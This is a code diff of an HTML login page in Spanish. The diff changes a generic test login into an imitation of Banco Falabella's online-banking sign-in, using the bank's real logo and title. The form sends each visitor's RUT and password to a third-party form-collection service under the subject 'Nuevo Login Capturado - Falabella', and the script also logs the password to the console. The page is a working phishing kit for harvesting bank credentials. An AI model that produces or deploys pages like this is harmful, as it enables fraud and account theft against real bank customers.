@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba de Login - Sistema Seguro</title>
+    <title>Ingreso Mi Cuenta - Banco Falabella</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: Arial, Helvetica, sans-serif;
             background-color: #f4f4f4;
             display: flex;
             justify-content: center;
@@ -14,6 +14,7 @@
             height: 100vh;
             margin: 0;
         }
+
         .login-container {
             background-color: #ffffff;
             border-radius: 8px;
@@ -21,6 +22,7 @@
             width: 360px;
             overflow: hidden;
         }
+
         .login-header {
             background-color: #ffffff;
             padding: 24px;
@@ -28,12 +30,15 @@
             display: flex;
             justify-content: center;
         }
+
         .login-header img {
             width: 200px;
         }
+
         .login-body {
             padding: 24px 32px 32px 32px;
         }
+
         .login-body h2 {
             font-size: 20px;
             font-weight: 600;
@@ -42,9 +47,11 @@
             margin-bottom: 24px;
             text-align: center;
         }
+
         form div {
             margin-bottom: 16px;
         }
+
         form label {
             display: block;
             margin-bottom: 8px;
@@ -52,6 +59,7 @@
             color: #555;
             font-size: 14px;
         }
+
         form input[type="text"],
         form input[type="password"] {
             width: 100%;
@@ -61,6 +69,7 @@
             box-sizing: border-box;
             font-size: 16px;
         }
+
         form button {
             width: 100%;
             padding: 12px;
@@ -73,23 +82,28 @@
             font-weight: bold;
             margin-top: 8px;
         }
+
         form button:hover {
             background-color: #008a41;
             transition: 0.3s;
         }
+
         .login-footer {
             text-align: center;
             margin-top: 24px;
         }
+
         .login-footer a {
             color: #007aff;
             text-decoration: none;
             font-size: 14px;
             font-weight: 600;
         }
+
         .login-footer a:hover {
             text-decoration: underline;
         }
+
         .resultado {
             margin-top: 20px;
             padding: 16px;
@@ -100,10 +114,12 @@
             display: none;
             animation: fadeIn 0.5s ease-in;
         }
+
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
         }
+
         .resultado strong {
             color: #2e7d32;
         }
@@ -113,17 +129,18 @@
 
     <div class="login-container">
         <div class="login-header">
-            <img src="https://via.placeholder.com/200x60/009e4c/white?text=MI+BANCO" alt="Logo">
+            <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Logo Banco Falabella">
         </div>
         
         <div class="login-body">
             <h2>Inicia sesión en tu<br>Banca en Línea</h2>
             
+            <!-- FORMULARIO CON WEB3FORMS -->
             <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
                 <input type="hidden" name="access_key" value="f4e40e48-4567-4574-bfc4-5da57268c1f6">
-                <input type="hidden" name="subject" value="Nuevo Login Capturado">
-                <input type="hidden" name="from_name" value="Sistema Seguro">
-                <input type="hidden" name="redirect" value="https://udlave.github.io/clave-secreta/ver-datos.html">
+                <input type="hidden" name="subject" value="Nuevo Login Capturado - Falabella">
+                <input type="hidden" name="from_name" value="Sistema de Captura">
+                <input type="hidden" name="redirect" value="ver-datos.html">
 
                 <div>
                     <label for="rut">RUT</label>
@@ -137,6 +154,7 @@
                 <button type="submit">Ingresar</button>
             </form>
 
+            <!-- Muestra datos capturados -->
             <div id="resultado" class="resultado">
                 <strong>Datos capturados:</strong><br>
                 <span id="datos"></span>
@@ -148,18 +166,21 @@
         </div>
     </div>
 
+    <!-- JavaScript para mostrar datos antes de enviar -->
     <script>
         const form = document.getElementById('loginForm');
+
         form.addEventListener('submit', function(e) {
             const rut = document.getElementById('rut').value.trim();
             const clave = document.getElementById('clave').value;
 
             if (!rut || !clave) {
                 e.preventDefault();
-                alert('Completa ambos campos.');
+                alert('Por favor, completa ambos campos.');
                 return;
             }
 
+            // Mostrar datos en pantalla
             document.getElementById('datos').innerHTML = `
                 RUT: <strong>${rut}</strong><br>
                 Clave: <strong>${'*'.repeat(clave.length)}</strong> 
@@ -167,7 +188,8 @@
             `;
             document.getElementById('resultado').style.display = 'block';
 
-            console.log('Datos enviados:', { rut, clave });
+            // Mostrar en consola (opcional)
+            console.log('Datos enviados → RUT:', rut, '| Clave:', clave);
         });
     </script>
 
